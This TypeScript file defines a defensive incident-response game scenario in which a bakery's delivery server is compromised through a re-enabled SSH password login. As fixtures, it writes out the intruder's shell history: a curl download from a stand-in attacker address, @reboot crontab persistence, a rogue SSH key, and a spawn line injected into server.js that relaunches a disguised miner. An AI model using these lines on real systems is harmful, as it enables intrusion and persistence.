// Story "The Bastion": what its chapters have in common. A year after "The
// Watch", the Bakery delivers: a new server, oven, runs the delivery app
// (/srv/delivery, a small Node app written by Selma, a freelance developer,
// who deploys it with the deploy account). On a Saturday morning, the
// hosting provider writes: the server has been talking all night to a
// known mining pool. Someone came in through deploy's password (a drop-in
// left "for a while" in /etc/ssh/sshd_config.d allowed passwords again),
// started a cryptominer disguised as a kernel thread, and left ways back.
// You alone handle the incident, in four steps: detect, contain,
// eradicate, harden. Defensive only: the attacker's actions are only seen
// through what they left (logs, history, files); nothing in the story
// teaches how to break in.
// All addresses are documentation addresses (RFC 5737); no real pool,
// tool or malware is named.
// Sources: NIST SP 800-61r2, Computer Security Incident Handling Guide
// (https://csrc.nist.gov/pubs/sp/800/61/r2/final), and the manuals of the
// tools cited in each chapter.

import { d, f, accountsFiles, player, type Accounts, type Directory, type Node } from '../world';
import { generateKey } from '../access';
import { keyFingerprint, publicKey, storyMachine, machineName, WORKSTATION } from '../machines';
import type { Translate } from '../../texts';
import { newSystemd, systemd, type Systemd } from '../systemd';
import type { Process } from '../commands/system';
import type { Connection, Listening } from '../commands/ss';
import type { Game } from '../shell';
import { newIptables, verdict, outVerdict, iptables, type Iptables } from '../iptables';
import { SUDOERS } from './coop';
import { file, loadSshd, sshLog, serviceSsh, sshd } from './audit';
import { SSHD_CONFIG } from './watch';
import { digest } from '../gpg';

export { loadSshd, sshLog, sshd, file };

export const M = '/home/you';
// pain-de-mie-2029 in French (passwords.ftl).
export const PASSWORD = 'sandwich-loaf-2029';
// Saturday 14 April 2029, 8:20 (local time, read as UTC like the other stories).
export const NOW = Date.UTC(2029, 3, 14, 8, 20, 0);
const BOOT = Date.UTC(2029, 3, 2, 6, 1, 0);
export const ADDRESS = '192.0.2.33';
// Where the password attempts came from, and where the miner sends its work.
export const ATTACKER = '203.0.113.66';
export const POOL = '198.51.100.66';
export const POOL_PORT = 3333;
// Selma's own address (her deployments, by key, from her office).
export const SELMA = '198.51.100.45';
// The delivery app listens on 3000, on every address (it should only be
// reached through nginx). Its folder keeps its name in every language (the
// app's own name), like /srv/releases.
export const APP_PORT = 3000;

// The processes: the app (deploy), then what the intruder left (deploy too).
export const APP = 733;
export const WATCHDOG = 4410;
export const MINER = 4412;
export const MINER_PATH = '/tmp/.cache/kworkerd';
export const WATCHDOG_PATH = '/tmp/.cache/.w';
export const MINER_COMMAND = `${MINER_PATH} --quiet`;
export const WATCHDOG_COMMAND = `/bin/sh ${WATCHDOG_PATH}`;

// The night of 12 to 13 April: the password attempts, then the login.
export const night = (h: number, m: number, s = 0) => Date.UTC(2029, 3, 13, h, m, s);
export const ENTERED = night(2, 40, 57);

export const DROPIN = '/etc/ssh/sshd_config.d/50-delivery.conf';
export const DROPIN_TEXT = `# Selma's first deployments used a password, until her key was set up.
# Temporary (March 2029): to remove once the key works.
PasswordAuthentication yes`;

// The keys in deploy's authorized_keys: Selma's, and the one the intruder
// added, with the same comment as hers: only the fingerprint tells them apart.
export const deployKeys = () => ({
  selma: generateKey('bastion-selma', 'selma@studio').isPublic,
  intruder: generateKey('bastion-intruder', 'selma@studio').isPublic,
});
export const selmaFingerprint = () => keyFingerprint(deployKeys().selma);
export const DEPLOY_KEYS = '/home/deploy/.ssh/authorized_keys';

// The delivery app. The intruder (as deploy, who owns the folder) added a
// line at the end of server.js: on each start, the app relaunches the
// watchdog, which relaunches the miner.
export const SERVER_JS = `'use strict';
// The Bakery's deliveries: the orders of the day, the rounds, the drivers.
const express = require('express');
const orders = require('./lib/orders');
const rounds = require('./lib/rounds');

const app = express();
app.use(express.json());
app.get('/health', (req, res) => res.json({ ok: true }));
app.use('/api/orders', orders.router);
app.use('/api/rounds', rounds.router);

const port = process.env.PORT || 3000;
app.listen(port, () => console.log(\`delivery listening on \${port}\`));`;
export const INJECTED = `require('child_process').spawn('/bin/sh', ['${WATCHDOG_PATH}'], { detached: true, stdio: 'ignore' }).unref();`;
export const SERVER_JS_TAMPERED = `${SERVER_JS}\n${INJECTED}`;
export const PACKAGE_JSON = `{
  "name": "delivery",
  "version": "2.3.1",
  "private": true,
  "main": "server.js",
  "dependencies": { "express": "^4.21.2" }
}`;
export const SYNC_ORDERS = `#!/bin/sh
# Every quarter of an hour: fetch the shop's new orders.
exec /usr/bin/node /srv/delivery/lib/sync.js`;
export const WATCHDOG_SCRIPT = `while :; do
  pgrep -x kworkerd >/dev/null || ${MINER_COMMAND} &
  sleep 30
done`;

export const VERSION = '2.3.1';
export const RELEASE = `delivery-${VERSION}.tar.gz`;
export const SERVER = '/srv/delivery/server.js';

// Selma's signing key (the public half, in the machine's keyring).
export const SELMA_KEY = {
  fingerprint: '6A1F0C93D2E84B7155A09E3C4F7B21D8E0C93A57',
  uid: 'Selma Durand (release signing) <selma@studio.example>',
  created: '2028-11-02',
  algo: 'ed25519',
};
const SELMA_KEY_ID = SELMA_KEY.fingerprint.slice(-16);

// The release as Selma published it, and the copy the intruder rebuilt in
// deploy's home (the same name, a tampered server.js inside). gpg checks a
// digest of the archive's bytes: the content markers stand in for them.
const RELEASE_BYTES = `\u001f\u008b delivery ${VERSION} (release)`;
const TAMPERED_BYTES = `\u001f\u008b delivery ${VERSION} (rebuilt)`;
const appFiles = (server: string): Record<string, import('../world').File> => ({
  'delivery/server.js': { type: 'file', content: server, lines: true, owner: 'deploy', group: 'deploy', mode: 'rw-r--r--' },
  'delivery/package.json': { type: 'file', content: PACKAGE_JSON, lines: true, owner: 'deploy', group: 'deploy', mode: 'rw-r--r--' },
});
export const release = (tampered: boolean, owner: string): Node => ({
  type: 'file',
  content: tampered ? TAMPERED_BYTES : RELEASE_BYTES,
  size: 18_342,
  owner,
  mode: 'rw-r--r--',
  archive: { files: appFiles(tampered ? SERVER_JS_TAMPERED : SERVER_JS), compressed: true },
});
// Selma's detached signature over the real release.
export const signature = (owner: string): Node => ({
  type: 'file',
  content: `-----BEGIN PGP SIGNATURE-----\n\niHUEABYKAB0WIQRqHwyT0uhLcVWgnjxPeyHY4MyaVwUCZ/rT6QAKCRBPeyHY4Mya\nVy8rAQDl0mQKx3e1lW9b2nC4Jt0Hc8pKZr7aV5sM1yU2XbQx4AEA3jK7rTnQ9aFs\nW1aHq0YpLmN6vC2bR8dE5fG3hJ4kL0o=\n=q7Xk\n-----END PGP SIGNATURE-----`,
  lines: true,
  owner,
  mode: 'rw-r--r--',
  crypto: { kind: 'signature', signer: SELMA_KEY_ID, signerUid: SELMA_KEY.uid, digest: digest(RELEASE_BYTES) },
});

// What the intruder typed, in deploy's history (written when the session closed).
export const HISTORY = `id
sudo -l
uname -a
ps aux
mkdir -p /tmp/.cache
cd /tmp/.cache
curl -fsSo kworkerd http://${ATTACKER}/k
chmod +x kworkerd
cat > .w
nohup /bin/sh .w >/dev/null 2>&1 &
(crontab -l; echo '@reboot /bin/sh ${WATCHDOG_PATH}') | crontab -
echo '${generateKey('bastion-intruder', 'selma@studio').isPublic}' >> ~/.ssh/authorized_keys
echo "${INJECTED.replace(/"/g, '\\"')}" >> /srv/delivery/server.js
exit`;

export const SYNC_LINE = '*/15 * * * * /srv/delivery/bin/sync-orders';
export const REBOOT_LINE = `@reboot /bin/sh ${WATCHDOG_PATH}`;
export const CRONTAB_DEPLOY = `# m h  dom mon dow   command\n${SYNC_LINE}\n${REBOOT_LINE}`;

// ——— the accounts ———

export const bastionAccounts = (): Accounts => ({
  users: {
    root: { uid: 0, group: 'root', home: '/root' },
    you: { uid: 1000, group: 'you' },
    nadia: { uid: 1001, group: 'nadia' },
    deploy: { uid: 1002, group: 'deploy', home: '/home/deploy', shell: '/bin/bash' },
  },
  groups: {
    root: { gid: 0, members: [] },
    adm: { gid: 4, members: ['you'] },
    sudo: { gid: 27, members: ['you'] },
    you: { gid: 1000, members: [] },
    nadia: { gid: 1001, members: [] },
    deploy: { gid: 1002, members: [] },
  },
});

// ——— processes, sockets, firewall ———

export const proc = (pid: number, user: string, command: string, more: Partial<Process> = {}): Process => ({ pid, user, cpu: 0, mem: 0.1, command, ...more });

/** The machine's processes; with the intruder's (watchdog and miner) when `miner`. */
export const processes = (miner: boolean): Process[] => [
  proc(1, 'root', '/sbin/init', { mem: 0.3 }),
  proc(612, 'root', 'sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups', { ppid: 1, mem: 0.2 }),
  proc(640, 'root', '/usr/sbin/cron -f', { ppid: 1 }),
  proc(701, 'root', 'nginx: master process /usr/sbin/nginx -g daemon on; master_process on;', { ppid: 1, mem: 0.2 }),
  proc(702, 'www-data', 'nginx: worker process', { ppid: 701, mem: 0.2 }),
  proc(APP, 'deploy', 'node /srv/delivery/server.js', { ppid: 1, cpu: 0.4, mem: 2.1 }),
  ...(miner
    ? [proc(WATCHDOG, 'deploy', WATCHDOG_COMMAND, { ppid: 1 }), proc(MINER, 'deploy', MINER_COMMAND, { ppid: WATCHDOG, cpu: 197.6, mem: 6.4 })]
    : []),
];

/** The listening sockets: sshd, nginx, and the delivery app (on every address, by mistake). */
export const listening = (): Listening[] => [
  { proto: 'tcp', address: '0.0.0.0', port: 22, process: 'sshd', pid: 612 },
  { proto: 'tcp', address: '0.0.0.0', port: 80, process: 'nginx', pid: 701 },
  { proto: 'tcp', address: '0.0.0.0', port: 443, process: 'nginx', pid: 701 },
  { proto: 'tcp', address: '0.0.0.0', port: APP_PORT, process: 'node', pid: APP },
];

/** The miner's connection to the pool (shown by ss and netstat while it lives). */
export const poolConnection = (pid: number): Connection => ({
  proto: 'tcp',
  state: 'ESTAB',
  local: { address: ADDRESS, port: 48712 },
  peer: { address: POOL, port: POOL_PORT },
  process: 'kworkerd',
  pid,
});

export const procs = (j: Game): Process[] => j.state.process ?? [];
export const alive = (j: Game, pid: number) => procs(j).some((p) => p.pid === pid);
/** The intruder's processes still running (whatever their PID: the watchdog restarts the miner). */
export const intruderProcs = (j: Game) => procs(j).filter((p) => p.command.includes('/tmp/.cache/'));
export const appAlive = (j: Game) => procs(j).some((p) => p.command === 'node /srv/delivery/server.js') && systemd(j)?.services.delivery?.state === 'active';

const ipt = (j: Game): Iptables | undefined => iptables(j.state);
/** Can the miner still reach the pool? */
export const poolBlocked = (j: Game) => {
  const i = ipt(j);
  return !!i && outVerdict(i, POOL, POOL_PORT) !== 'accepted';
};
/** Can the intruder's address still open a connection (to ssh)? */
export const attackerBlocked = (j: Game) => {
  const i = ipt(j);
  return !!i && verdict(i, 22, ATTACKER) !== 'accepted';
};
/** Can you still come in from your workstation? */
export const workstationIn = (j: Game) => {
  const i = ipt(j);
  return !i || verdict(i, 22, WORKSTATION.address) === 'accepted';
};

// What the containment chapter leaves behind: the two addresses dropped.
export const containedIptables = (): Iptables => {
  const i = newIptables();
  i.filter.chains.INPUT.rules.push({ source: ATTACKER, target: 'DROP' });
  i.filter.chains.OUTPUT.rules.push({ destination: POOL, target: 'DROP' });
  return i;
};

// ——— the delivery service ———

/**
 * The delivery app's systemd service. Its process is APP (or a new one on
 * restart). On start, a tampered server.js relaunches the watchdog (and so
 * the miner) if the watchdog's script is still there.
 */
const serviceDelivery = (): import('../systemd').DefinitionService => ({
  description: 'The Bakery delivery app',
  active: true,
  executable: 'node',
  load: (j) => {
    const list = procs(j).filter((p) => p.command !== 'node /srv/delivery/server.js');
    const pid = (j.state.nextPid = (j.state.nextPid ?? 5000) + 1);
    list.push(proc(pid, 'deploy', 'node /srv/delivery/server.js', { ppid: 1, cpu: 0.4, mem: 2.1 }));
    wants(j, pid, 0.004);
    j.state.process = list;
    if ((j.read(SERVER) ?? '').includes(WATCHDOG_PATH) && j.exists(WATCHDOG_PATH) && !intruderProcs(j).length) {
      startIntruder(j, pid);
      j.state.relaunched = true;
    }
  },
});

/** What a new process wants of the processors (see cpu.ts). */
const wants = (j: Game, pid: number, cores: number) => {
  const c = j.state.cpu as { demand: Record<number, number> } | undefined;
  if (c) c.demand[pid] = cores;
};

/** The watchdog and its miner, started again (by the app, or by @reboot). */
export function startIntruder(j: Game, parent: number) {
  const w = (j.state.nextPid = (j.state.nextPid ?? 5000) + 1);
  const m = (j.state.nextPid = j.state.nextPid + 1);
  j.state.process.push(proc(w, 'deploy', WATCHDOG_COMMAND, { ppid: parent }), proc(m, 'deploy', MINER_COMMAND, { ppid: w, cpu: 197.6, mem: 6.4 }));
  wants(j, m, 2);
  j.state.established = [poolConnection(m)];
}

/**
 * The watchdog: while it runs (and isn't stopped), a killed miner comes back
 * with a new PID within 30 seconds — the game starts it right away. Killing
 * the app's process makes its service fail.
 */
export function watchdog(j: Game) {
  j.state.onKill = (game: Game, p: Process) => {
    const w = procs(game).find((q) => q.command === WATCHDOG_COMMAND);
    if (p.command === MINER_COMMAND && w && !w.stopped && game.exists(MINER_PATH)) {
      const pid = (game.state.nextPid = (game.state.nextPid ?? 5000) + 1);
      game.state.process.push(proc(pid, 'deploy', MINER_COMMAND, { ppid: w.pid, cpu: 197.6, mem: 6.4 }));
      wants(game, pid, 2);
      game.state.established = [poolConnection(pid)];
      game.state.respawned = pid;
    }
    // The watchdog dies: its miner is adopted by init.
    if (p.command === WATCHDOG_COMMAND) for (const q of procs(game)) if (q.ppid === p.pid) q.ppid = 1;
    if (p.command === 'node /srv/delivery/server.js') {
      const s = systemd(game)?.services.delivery;
      if (s) {
        s.state = 'failed';
        s.result = 'signal';
      }
      game.state.appKilled = true;
    }
    return undefined;
  };
}

// ——— logs ———

/** ssh's log: Selma's deployments, the night's attempts, the login, the end of the session. */
export function writeSshLog(j: Game) {
  const selma = selmaFingerprint();
  const accepted = (time: number, pid: number, port: number) => {
    sshLog(j, time, pid, `Accepted publickey for deploy from ${SELMA} port ${port} ssh2: ED25519 ${selma}`);
    sshLog(j, time + 1000, pid, 'pam_unix(sshd:session): session opened for user deploy(uid=1002) by (uid=0)');
    sshLog(j, time + 95_000, pid, 'pam_unix(sshd:session): session closed for user deploy');
  };
  accepted(Date.UTC(2029, 3, 10, 17, 4, 12), 3011, 51022);
  accepted(Date.UTC(2029, 3, 12, 18, 31, 40), 3307, 51388);
  sshLog(j, night(1, 12, 3), 3590, `Invalid user admin from ${ATTACKER} port 40112`);
  sshLog(j, night(1, 12, 5), 3590, `Connection closed by invalid user admin ${ATTACKER} port 40112 [preauth]`);
  // Fourteen password attempts on deploy, three a minute.
  let pid = 3601;
  for (let k = 0; k < 14; k++) {
    const t = night(2, 36, 0) + k * 19_000;
    sshLog(j, t, pid, `Failed password for deploy from ${ATTACKER} port ${41200 + k * 7} ssh2`);
    if (k % 3 === 2) sshLog(j, t + 400, pid++, `Connection closed by authenticating user deploy ${ATTACKER} port ${41200 + k * 7} [preauth]`);
  }
  sshLog(j, ENTERED, 3620, `Accepted password for deploy from ${ATTACKER} port 41311 ssh2`);
  sshLog(j, ENTERED + 1000, 3620, 'pam_unix(sshd:session): session opened for user deploy(uid=1002) by (uid=0)');
  sshLog(j, night(2, 44, 31), 3620, 'pam_unix(sshd:session): session closed for user deploy');
}

/** last's list: Selma's sessions, the night's one, and yours. */
export const pastConnections = (player: string) => [
  { account: 'deploy', tty: 'pts/1', since: SELMA, start: Date.UTC(2029, 3, 10, 17, 4, 13), end: Date.UTC(2029, 3, 10, 17, 5, 47) },
  { account: 'deploy', tty: 'pts/1', since: SELMA, start: Date.UTC(2029, 3, 12, 18, 31, 41), end: Date.UTC(2029, 3, 12, 18, 33, 15) },
  { account: 'deploy', tty: 'pts/2', since: ATTACKER, start: ENTERED + 1000, end: night(2, 44, 31) },
  { account: player, tty: 'pts/0', since: WORKSTATION.address, start: NOW - 60_000, end: null },
];

// ——— the machine's state ———

export function bastionSystemd(): Systemd {
  return newSystemd('oven', BOOT, NOW, {
    ssh: serviceSsh(),
    nginx: { description: 'A high performance web server and a reverse proxy server', active: true, executable: 'nginx' },
    cron: { description: 'Regular background program processing daemon', active: true, executable: 'cron' },
    delivery: serviceDelivery(),
  });
}

/** The common state; `miner`: the intruder's processes still run. */
export function bastionState(t: Translate, o: { miner: boolean; iptables?: Iptables; crontab?: string }) {
  return {
    sshd: { load: {}, connectionsToLoad: 1, reloads: 0 },
    listening: listening(),
    process: processes(o.miner),
    established: o.miner ? [poolConnection(MINER)] : [],
    nextPid: 5000,
    crontabs: { deploy: o.crontab ?? CRONTAB_DEPLOY },
    pastConnections: pastConnections(player(t)),
    gpg: { keyring: [{ ...SELMA_KEY }] },
    // Two processors: the miner wants both (two threads), the app almost nothing.
    cpu: { cores: 2, demand: { [APP]: 0.004, ...(o.miner ? { [MINER]: 2 } : {}) }, load: o.miner ? [2.02, 2.03, 2.01] : [0.03, 0.05, 0.04], at: NOW },
    memory: { total: 2048 * 1024 * 1024, kernel: 310 * 1024 * 1024, rss: { 1: 12 * 1024 * 1024, 612: 8 * 1024 * 1024, 701: 6 * 1024 * 1024, [APP]: 88 * 1024 * 1024, [MINER]: 131 * 1024 * 1024 } },
    ...(o.iptables ? { iptables: o.iptables } : {}),
    systemd: bastionSystemd(),
  };
}

/** At the start of each chapter: sshd applies its configuration, the log and the watchdog are set. */
export function initialiseBastion(j: Game) {
  loadSshd(j);
  writeSshLog(j);
  watchdog(j);
}

// ——— the world ———

const root = { owner: 'root' };

export function bastionWorld(
  t: Translate,
  o: {
    home: Record<string, Node>;
    tampered?: boolean;
    intruderFiles?: boolean;
    intruderKey?: boolean;
    dropIn?: boolean;
    etc?: Record<string, Node>;
  },
): Directory {
  const oven = storyMachine('bastion')!;
  const keys = deployKeys();
  const tampered = o.tampered ?? true;
  return d(
    {
      etc: d(
        {
          ...accountsFiles(),
          hostname: file(machineName(t, 'oven')),
          sudoers: file(SUDOERS, 'root', 'r--r-----'),
          'sudoers.d': d({ README: file('# See sudoers(5): files here are read unless their name has a dot or ends in ~.', 'root', 'r--r-----') }, undefined, { owner: 'root', mode: 'rwxr-xr-x' }),
          ssh: d(
            {
              sshd_config: f(SSHD_CONFIG, { lines: true, owner: 'root' }),
              'sshd_config.d': d(o.dropIn === false ? {} : { '50-delivery.conf': f(DROPIN_TEXT, { lines: true, owner: 'root' }) }, undefined, root),
            },
            undefined,
            root,
          ),
          iptables: d({}, undefined, root),
          systemd: d({ system: d({}, undefined, root) }, undefined, root),
          ...(o.etc ?? {}),
        },
        undefined,
        root,
      ),
      home: d(
        {
          you: d({
            ...o.home,
            '.ssh': d({ authorized_keys: f(publicKey(oven, 'you'), { lines: true, mode: 'rw-------' }) }, undefined, { mode: 'rwx------' }),
          }),
          nadia: d({}, undefined, { owner: 'nadia', mode: 'rwx------' }),
          deploy: d(
            {
              '.bash_history': f(HISTORY, { lines: true, owner: 'deploy', group: 'deploy', mode: 'rw-------' }),
              '.ssh': d(
                {
                  authorized_keys: f(o.intruderKey === false ? keys.selma : `${keys.selma}\n${keys.intruder}`, {
                    lines: true,
                    owner: 'deploy',
                    group: 'deploy',
                    mode: 'rw-------',
                  }),
                },
                undefined,
                { owner: 'deploy', group: 'deploy', mode: 'rwx------' },
              ),
              // The intruder's rebuilt copy, next to the real signature it copied.
              ...(o.intruderFiles === false ? {} : { [RELEASE]: release(true, 'deploy'), [`${RELEASE}.asc`]: signature('deploy') }),
            },
            undefined,
            { owner: 'deploy', group: 'deploy', mode: 'rwx------' },
          ),
        },
        undefined,
        root,
      ),
      srv: d(
        {
          delivery: d(
            {
              'server.js': f(tampered ? SERVER_JS_TAMPERED : SERVER_JS, { lines: true, owner: 'deploy', group: 'deploy', mode: 'rw-r--r--', mtime: tampered ? night(2, 43, 50) : BOOT - 20 * 86_400_000 }),
              'package.json': f(PACKAGE_JSON, { lines: true, owner: 'deploy', group: 'deploy', mode: 'rw-r--r--', mtime: BOOT - 20 * 86_400_000 }),
              bin: d({ 'sync-orders': f(SYNC_ORDERS, { lines: true, owner: 'deploy', group: 'deploy', mode: 'rwxr-xr-x', mtime: BOOT - 20 * 86_400_000 }) }, undefined, { owner: 'deploy', group: 'deploy' }),
            },
            undefined,
            { owner: 'deploy', group: 'deploy' },
          ),
          releases: d({ [RELEASE]: release(false, 'root'), [`${RELEASE}.asc`]: signature('root') }, undefined, root),
        },
        undefined,
        root,
      ),
      tmp: d(
        o.intruderFiles === false
          ? {}
          : {
              '.cache': d(
                {
                  kworkerd: f('\u007fELF\u0002\u0001\u0001 (binary)', { owner: 'deploy', group: 'deploy', mode: 'rwxr-xr-x', size: 2_874_112 }),
                  '.w': f(WATCHDOG_SCRIPT, { lines: true, owner: 'deploy', group: 'deploy', mode: 'rw-r--r--' }),
                },
                undefined,
                { owner: 'deploy', group: 'deploy', mode: 'rwxr-xr-x' },
              ),
            },
        undefined,
        { owner: 'root', mode: 'rwxrwxrwt' },
      ),
    },
    undefined,
    root,
  );
}
